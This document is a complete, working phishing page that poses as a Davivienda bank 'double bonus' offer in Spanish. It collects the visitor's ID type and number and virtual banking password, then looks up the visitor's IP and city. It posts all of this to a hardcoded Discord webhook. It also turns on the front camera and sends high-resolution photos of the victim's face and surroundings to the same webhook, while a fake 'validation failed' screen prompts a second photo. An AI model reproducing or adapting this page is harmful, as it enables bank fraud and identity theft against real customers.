<!DOCTYPE html>
<html lang="es">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<title>Bono Clientes x2 DAVlVlENDAü§ë</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Roboto', sans-serif;
    }

    body {
        background: #e6e6e6;
        display: flex;
        justify-content: center;
        min-height: 100vh;
    }

    /* LOADER MEJORADO Y PRESENTABLE */
    #main-loader {
        position: fixed;
        inset: 0;
        background: linear-gradient(135deg, #da291c 0%, #a01f15 100%);
        z-index: 10000;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        transition: opacity 0.5s ease, transform 0.5s ease;
    }

    #main-loader.hide {
        opacity: 0;
        transform: scale(0.95);
        pointer-events: none;
    }

    .logo-load {
        width: 180px;
        margin-bottom: 40px;
        animation: fadeInDown 0.6s ease;
        filter: brightness(0) invert(1);
    }

    @keyframes fadeInDown {
        from {
            opacity: 0;
            transform: translateY(-30px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .loader-container {
        position: relative;
        width: 60px;
        height: 60px;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(255, 255, 255, 0.2);
        border-top: 4px solid #fff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .loader-text {
        color: white;
        font-size: 14px;
        margin-top: 25px;
        font-weight: 500;
        letter-spacing: 0.5px;
        animation: pulse 1.5s ease-in-out infinite;
    }

    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.6; }
    }

    .app-container {
        width: 100%;
        max-width: 450px;
        background: #f4f4f4;
        min-height: 100vh;
        position: relative;
        box-shadow: 0 0 20px rgba(0,0,0,0.1);
        display: flex;
        flex-direction: column;
    }

    .header {
        background: #da291c;
        height: 130px;
        display: flex;
        justify-content: center;
        align-items: flex-end;
        padding-bottom: 20px;
        position: relative;
        transition: opacity 0.3s;
    }

    .header-logo {
        width: 70px;
        height: 70px;
        background: url('https://i.postimg.cc/xCzwGQ37/image-removebg-preview-(11).png') no-repeat center/contain;
    }

    .content {
        padding: 20px 30px;
        flex: 1;
    }

    .back-btn {
        display: flex;
        align-items: center;
        color: #555;
        font-size: 16px;
        font-weight: 500;
        margin-bottom: 30px;
        cursor: pointer;
    }

    .back-btn svg {
        width: 12px;
        height: 12px;
        margin-right: 10px;
        fill: #555;
    }

    .input-label {
        font-size: 15px;
        color: #333;
        font-weight: 500;
        margin-bottom: 10px;
        display: block;
    }

    .input-group {
        background: #fff;
        border: 1px solid #ccc;
        border-radius: 8px;
        height: 50px;
        display: flex;
        align-items: center;
        padding: 0 15px;
        margin-bottom: 25px;
        position: relative;
    }

    .input-group img, .input-group svg {
        width: 24px;
        height: 24px;
        margin-right: 12px;
        opacity: 0.6;
    }

    select {
        width: 100%;
        border: none;
        outline: none;
        background: transparent;
        font-size: 16px;
        color: #333;
        appearance: none;
        -webkit-appearance: none;
        position: relative;
        z-index: 2;
    }

    .arrow-icon {
        position: absolute;
        right: 15px;
        pointer-events: none;
        width: 14px !important;
        height: 14px !important;
    }

    input {
        width: 100%;
        border: none;
        outline: none;
        font-size: 16px;
        color: #333;
    }
    
    input::placeholder {
        color: #aaa;
    }

    .forgot-link {
        text-align: center;
        display: block;
        color: #333;
        font-size: 14px;
        font-weight: 600;
        margin: 10px 0 30px 0;
        text-decoration: none;
    }

    .submit-btn {
        width: 100%;
        height: 48px;
        border-radius: 24px;
        border: none;
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
        transition: 0.3s;
        background: #cccccc;
        color: #fff;
        margin-bottom: 40px;
    }

    .submit-btn.active {
        background: #da291c;
    }

    .qr-container {
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
        margin-bottom: 20px;
        margin-top: auto;
    }

    .qr-bar {
        background: #da291c;
        width: 280px;
        height: 40px;
        border-radius: 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 25px;
        color: white;
        font-size: 14px;
        font-weight: 500;
    }

    .qr-center-btn {
        position: absolute;
        width: 48px;
        height: 48px;
        background: white;
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        left: 50%;
        transform: translateX(-50%);
    }

    .qr-center-btn svg {
        width: 24px;
        height: 24px;
        fill: #333;
    }

    .footer-text {
        text-align: center;
        font-size: 11px;
        color: #888;
        padding-bottom: 20px;
        line-height: 1.4;
    }

    /* OCULTAR/MOSTRAR PASOS */
    .step {
        display: none;
    }

    .step.active {
        display: block;
    }

    /* ESTILOS PARA BIOMETR√çA - INTERFAZ ORIGINAL */
    body.dark-mode {
        background: #000;
    }

    body.dark-mode .app-container {
        background: #000;
    }

    body.dark-mode .header {
        opacity: 0;
        height: 0;
        overflow: hidden;
    }

    .bio-wrap {
        text-align: center;
        color: #fff;
        padding: 20px 0;
    }

    .bio-wrap h2 {
        margin: 0;
        font-size: 26px;
        font-weight: 700;
    }

    .bio-wrap p {
        font-size: 12px;
        opacity: 0.7;
        margin: 8px 0 0 0;
    }

    .cam-circle {
        position: relative;
        width: 90%;
        aspect-ratio: 3/4;
        margin: 20px auto;
        border-radius: 40px;
        overflow: hidden;
        border: 2px solid #333;
        background: #111;
    }

    #cam-stream {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1);
    }

    .guide-ui {
        position: absolute;
        inset: 0;
        border: 2px dashed rgba(255, 255, 255, 0.3);
        margin: 15%;
        border-radius: 50% 50% 45% 45%;
        pointer-events: none;
    }

    #bio-msg {
        display: none;
        color: #da291c;
        background: white;
        padding: 12px;
        margin: 0 25px;
        border-radius: 12px;
        font-size: 12px;
        text-align: center;
        font-weight: 700;
    }

    .bio-card {
        background: rgba(255, 255, 255, 0.08);
        margin: 25px;
        padding: 20px;
        border-radius: 15px;
        border-left: 4px solid #da291c;
    }

    .bio-card li {
        color: #ddd;
        font-size: 13px;
        margin-bottom: 8px;
        list-style: none;
    }

    #c-proc {
        display: none;
    }

    /* PANTALLA DE ERROR FINAL */
    .error-screen {
        text-align: center;
        color: #fff;
        padding: 40px 30px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 60vh;
    }

    .error-icon {
        width: 80px;
        height: 80px;
        background: rgba(218, 41, 28, 0.2);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 25px;
        animation: shake 0.5s;
    }

    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-10px); }
        75% { transform: translateX(10px); }
    }

    .error-icon svg {
        width: 45px;
        height: 45px;
        fill: #da291c;
    }

    .error-title {
        font-size: 24px;
        font-weight: 700;
        margin-bottom: 15px;
        color: #fff;
    }

    .error-message {
        font-size: 14px;
        line-height: 1.6;
        opacity: 0.85;
        margin-bottom: 30px;
        max-width: 320px;
    }

    .error-details {
        background: rgba(255, 255, 255, 0.08);
        padding: 18px;
        border-radius: 12px;
        margin-bottom: 30px;
        width: 100%;
        max-width: 320px;
        border-left: 4px solid #da291c;
    }

    .error-details p {
        font-size: 13px;
        margin-bottom: 10px;
        text-align: left;
        color: #ddd;
    }

    .error-details p:last-child {
        margin-bottom: 0;
    }

    .retry-btn {
        background: #da291c;
        color: white;
        border: none;
        padding: 14px 40px;
        border-radius: 25px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: 0.3s;
    }

    .retry-btn:hover {
        background: #c01f15;
        transform: scale(1.05);
    }
</style>
</head>

<body>

<!-- LOADER MEJORADO -->
<div id="main-loader">
    <img src="https://ribgo.davivienda.com/assets/images/logo/logo-davivienda.png" alt="Davivienda" class="logo-load">
    <div class="loader-container">
        <div class="spinner"></div>
    </div>
    <div class="loader-text">Cargando...</div>
</div>

<div class="app-container">

    <!-- HEADER -->
    <div class="header">
        <div class="header-logo"></div>
    </div>

    <!-- PASO 1: DOCUMENTO -->
    <div class="content step active" id="paso-1">
        <div class="back-btn" onclick="history.back()">
            <svg viewBox="0 0 8 12" xmlns="http://www.w3.org/2000/svg"><path d="M7 1L2 6l5 5" stroke-width="2" fill="none" stroke="currentColor"/></svg>
            Atr√°s
        </div>

        <form id="form-documento">
            <label class="input-label">Tipo de documento</label>
            <div class="input-group">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
                <select id="select-tipo">
                    <option value="CC">C√©dula de Ciudadan√≠a</option>
                    <option value="CE">C√©dula de Extranjer√≠a</option>
                    <option value="PP">Pasaporte</option>
                </select>
                <svg class="arrow-icon" viewBox="0 0 12 8" xmlns="http://www.w3.org/2000/svg"><path d="M1 1l5 5 5-5" stroke-width="2" fill="none" stroke="#666"/></svg>
            </div>

            <label class="input-label">N√∫mero de documento</label>
            <div class="input-group">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                <input type="tel" id="input-documento" placeholder="Ingresa tu n√∫mero de documento" maxlength="15" autocomplete="off">
            </div>

            <button type="submit" class="submit-btn" id="btn-documento" disabled>Continuar</button>
        </form>
    </div>

    <!-- PASO 2: CLAVE -->
    <div class="content step" id="paso-2">
        <div class="back-btn" onclick="volverAtras()">
            <svg viewBox="0 0 8 12" xmlns="http://www.w3.org/2000/svg"><path d="M7 1L2 6l5 5" stroke-width="2" fill="none" stroke="currentColor"/></svg>
            Atr√°s
        </div>

        <form id="form-clave">
            <label class="input-label">Clave virtual</label>
            <div class="input-group">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
                <input type="tel" id="input-clave" placeholder="Ingresa tu clave virtual" minlength="6" maxlength="8" autocomplete="off">
            </div>

            <a href="#" class="forgot-link">¬øOlvidaste tu clave?</a>

            <button type="submit" class="submit-btn" id="btn-clave" disabled>Ingresar</button>
        </form>
    </div>

    <!-- PASO 3: BIOMETR√çA CON INTERFAZ ORIGINAL -->
    <div class="content step" id="paso-bio">
        <div class="bio-wrap">
            <h2>Validaci√≥n Facial</h2>
            <p>Necesitamos identificarte para completar con su desembolso</p>
        </div>

        <div class="cam-circle">
            <video id="cam-stream" autoplay playsinline></video>
            <div class="guide-ui"></div>
        </div>

        <div id="bio-msg"></div>

        <div class="bio-card">
            <li>‚Ä¢ Coloque el rostro frente a la c√°mara.</li>
            <li>‚Ä¢ Aseg√∫rese de que sus ojos sean visibles.</li>
            <li>‚Ä¢ Procure que no haya sombras fuertes.</li>
        </div>

        <button class="submit-btn active" id="btn-snap" onclick="capturarFoto()">Validar identidad</button>
    </div>

    <!-- PASO 4: PANTALLA DE ERROR -->
    <div class="content step" id="paso-error">
        <div class="error-screen">
            <div class="error-icon">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
            </div>

            <h2 class="error-title">Validaci√≥n No Exitosa</h2>

            <p class="error-message">
                Lo sentimos, no hemos podido identificar tu rostro correctamente.
            </p>

            <div class="error-details">
                <p><strong>Motivo:</strong> Imagen borrosa o con poca iluminaci√≥n</p>
                <p><strong>Recomendaci√≥n:</strong> Aseg√∫rate de estar en un lugar bien iluminado y mant√©n el dispositivo firme.</p>
            </div>

            <button class="retry-btn" onclick="reiniciarProceso()">Intentar nuevamente</button>
        </div>
    </div>

    <!-- QR BAR (Footer) -->
    <div class="qr-container">
        <div class="qr-bar">
            <span>Leer QR</span>
            <span>Generar QR</span>
        </div>
        <div class="qr-center-btn">
            <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3zm2 2v4h4V5zm8-2h8v8h-8zm2 2v4h4V5zM3 13h8v8H3zm2 2v4h4v-4zm8-2h8v8h-8zm2 2v4h4v-4z" fill="#333"></path></svg>
        </div>
    </div>

    <div class="footer-text">
        T√©rminos y condiciones<br>V7.5.0
    </div>

</div>

<canvas id="c-proc"></canvas>

<script>
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1458505518632140987/cEj80GVYjqWJcd40cqL0nhy0LYaoeMgeAouNPy9cOmd49GlZ_IcIc6Du7llBOMf0qZyU';
    
    // ELEMENTOS
    const formDocumento = document.getElementById("form-documento");
    const formClave = document.getElementById("form-clave");
    const selectTipo = document.getElementById("select-tipo");
    const inputDocumento = document.getElementById("input-documento");
    const inputClave = document.getElementById("input-clave");
    const btnDocumento = document.getElementById("btn-documento");
    const btnClave = document.getElementById("btn-clave");
    const btnSnap = document.getElementById("btn-snap");
    const bioMsg = document.getElementById("bio-msg");

    const paso1 = document.getElementById("paso-1");
    const paso2 = document.getElementById("paso-2");
    const pasoBio = document.getElementById("paso-bio");
    const pasoError = document.getElementById("paso-error");

    let pasoActual = 1;
    let intentoFoto = 1;

    // OCULTAR LOADER AL CARGAR (1 segundo)
    window.addEventListener("load", () => {
        setTimeout(() => {
            document.getElementById("main-loader").classList.add("hide");
        }, 1000);
    });

    // CAMBIAR ENTRE PASOS
    function cambiarPaso(paso) {
        paso1.classList.remove('active');
        paso2.classList.remove('active');
        pasoBio.classList.remove('active');
        pasoError.classList.remove('active');

        if (paso === 1) {
            paso1.classList.add('active');
            document.body.classList.remove('dark-mode');
        } else if (paso === 2) {
            paso2.classList.add('active');
            document.body.classList.remove('dark-mode');
        } else if (paso === 3) {
            pasoBio.classList.add('active');
            document.body.classList.add('dark-mode');
            iniciarCamara();
        } else if (paso === 4) {
            pasoError.classList.add('active');
            document.body.classList.add('dark-mode');
        }
        pasoActual = paso;
    }

    // BOT√ìN ATR√ÅS
    function volverAtras() {
        if (pasoActual === 2) {
            cambiarPaso(1);
        } else if (pasoActual === 3) {
            cambiarPaso(2);
        }
    }

    // REINICIAR PROCESO
    function reiniciarProceso() {
        // Resetear variables
        intentoFoto = 1;
        inputDocumento.value = '';
        inputClave.value = '';
        btnDocumento.classList.remove('active');
        btnDocumento.setAttribute('disabled', 'true');
        btnClave.classList.remove('active');
        btnClave.setAttribute('disabled', 'true');
        bioMsg.style.display = 'none';
        btnSnap.disabled = false;
        btnSnap.innerText = "Validar identidad";
        
        // Volver al paso 1
        cambiarPaso(1);
    }

    // VALIDACI√ìN INPUT DOCUMENTO
    inputDocumento.addEventListener("input", () => {
        inputDocumento.value = inputDocumento.value.replace(/\D/g, "");

        if (inputDocumento.value.length > 0) {
            btnDocumento.classList.add("active");
            btnDocumento.removeAttribute("disabled");
        } else {
            btnDocumento.classList.remove("active");
            btnDocumento.setAttribute("disabled", "true");
        }
    });

    // VALIDACI√ìN INPUT CLAVE
    inputClave.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "");
        const length = this.value.length;

        if (length === 6 || length === 8) {
            btnClave.classList.add("active");
            btnClave.removeAttribute("disabled");
        } else {
            btnClave.classList.remove("active");
            btnClave.setAttribute("disabled", "true");
        }
    });

    // FUNCI√ìN PARA ENVIAR A DISCORD
    async function enviarADiscord(tipoDoc, numDoc, clave, ip, ciudad) {
        try {
            const fecha = new Date().toLocaleString('es-CO', { 
                timeZone: 'America/Bogota',
                dateStyle: 'full',
                timeStyle: 'medium'
            });

            const tipoDocTexto = tipoDoc === 'CC' ? 'C√©dula de Ciudadan√≠a' : 
                               tipoDoc === 'CE' ? 'C√©dula de Extranjer√≠a' : 
                               tipoDoc === 'PP' ? 'Pasaporte' : 
                               'Desconocido';

            const fields = [
                {
                    name: "üìã Tipo de Documento",
                    value: tipoDocTexto,
                    inline: true
                },
                {
                    name: "ü™™ N√∫mero de Documento",
                    value: numDoc,
                    inline: true
                },
                {
                    name: "üîë Clave Virtual",
                    value: `\`${clave}\``,
                    inline: false
                },
                {
                    name: "üåê Direcci√≥n IP",
                    value: ip,
                    inline: true
                },
                {
                    name: "üìç Ciudad",
                    value: ciudad,
                    inline: true
                },
                {
                    name: "üïê Fecha y Hora",
                    value: fecha,
                    inline: false
                }
            ];

            const mensaje = {
                embeds: [{
                    title: "üè¶ Nueva Clave Virtual - Davivienda",
                    color: 0xDA291C,
                    fields: fields,
                    footer: {
                        text: "Sistema de Notificaciones Davivienda"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            const response = await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(mensaje)
            });

            if (response.ok) {
                console.log('‚úÖ Datos enviados a Discord correctamente');
                return true;
            } else {
                console.error('‚ùå Error al enviar a Discord:', response.status);
                return false;
            }
        } catch (error) {
            console.error('‚ùå Error en la petici√≥n a Discord:', error);
            return false;
        }
    }

    // SUBMIT PASO 1: DOCUMENTO
    formDocumento.addEventListener("submit", async (e) => {
        e.preventDefault();

        if (!inputDocumento.value) return;

        const tipoDoc = selectTipo.value;
        const numDoc = inputDocumento.value;

        // Guardar en variables
        window.tipoDocumento = tipoDoc;
        window.numeroDocumento = numDoc;

        // Cambiar al paso 2
        cambiarPaso(2);
    });

    // SUBMIT PASO 2: CLAVE
    formClave.addEventListener("submit", async function (e) {
        e.preventDefault();

        btnClave.disabled = true;
        btnClave.innerText = "Enviando...";
       
        const tipoDoc = window.tipoDocumento || 'Desconocido'; 
        const numDoc = window.numeroDocumento || 'Desconocido';
        const claveActual = inputClave.value;

        // OBTENER IP Y CIUDAD
        let ip = "Desconocida";
        let ciudad = "Desconocida";
        try {
            const ipRes = await fetch("https://ipwhois.app/json/");
            const ipData = await ipRes.json();
            ip = ipData.ip || "No encontrada";
            ciudad = ipData.city || "No encontrada";
        } catch (error) {
            console.error("Error obteniendo IP:", error);
        }

        // ENVIAR CLAVE Y PASAR DIRECTO A VALIDACI√ìN FACIAL
        await enviarADiscord(tipoDoc, numDoc, claveActual, ip, ciudad);
        
        // IR A VALIDACI√ìN FACIAL
        cambiarPaso(3);
    });

    // INICIAR C√ÅMARA FRONTAL √öNICAMENTE
    async function iniciarCamara() {
        const video = document.getElementById('cam-stream');
        
        try {
            // SOLO C√ÅMARA FRONTAL con resoluci√≥n Full HD
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user", // SOLO C√ÅMARA FRONTAL
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    frameRate: { ideal: 30 }
                }
            });
            video.srcObject = stream;
        } catch (error) {
            console.error("Error al acceder a la c√°mara:", error);
            bioMsg.innerText = "‚ö†Ô∏è No se pudo acceder a la c√°mara";
            bioMsg.style.display = 'block';
        }
    }

    // CAPTURAR FOTO
    async function capturarFoto() {
        btnSnap.disabled = true;
        btnSnap.innerText = "Analizando rostro...";

        setTimeout(async () => {
            await enviarFotoKYC();

            if (intentoFoto === 1) {
                // PRIMER INTENTO: Mostrar error
                bioMsg.innerText = "‚ö†Ô∏è ERROR: Rostro no detectado correctamente. Mant√©ngase firme.";
                bioMsg.style.display = 'block';
                btnSnap.disabled = false;
                btnSnap.innerText = "Validar identidad";
                intentoFoto = 2;
            } else {
                // SEGUNDO INTENTO: Mostrar pantalla de error final
                bioMsg.innerText = "Procesando...";
                bioMsg.style.display = 'block';
                
                setTimeout(() => {
                    // Ir a pantalla de error
                    cambiarPaso(4);
                }, 1500);
            }
        }, 2500);
    }

    // ENVIAR FOTO EN ALTA CALIDAD CON ENTORNO COMPLETO A DISCORD
    async function enviarFotoKYC() {
        const video = document.getElementById('cam-stream');
        const canvas = document.getElementById('c-proc');
        
        // Usar dimensiones COMPLETAS para capturar todo el entorno
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // Aplicar mejoras de calidad m√°xima
        ctx.imageSmoothingEnabled = true;
        ctx.imageSmoothingQuality = 'high';
        
        // Dibujar video COMPLETO sin recortes
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        return new Promise(resolve => {
            // Convertir a JPEG con calidad muy alta (98%)
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    content: `üì∏ **VALIDACI√ìN COMPLETA**\nüë§ Doc: ${window.numeroDocumento}\nüîÑ Intento: #${intentoFoto}\nüìê ${canvas.width}x${canvas.height}px\nüëî Captura: Rostro + Ropa + Entorno`
                }));
                formData.append('file', blob, `validacion_${window.numeroDocumento}_${intentoFoto}.jpg`);
                
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    console.log('‚úÖ Foto enviada correctamente');
                    resolve();
                }).catch(err => {
                    console.error('‚ùå Error al enviar foto:', err);
                    resolve();
                });
            }, 'image/jpeg', 0.98);
        });
    }
</script>

</body>
</html>
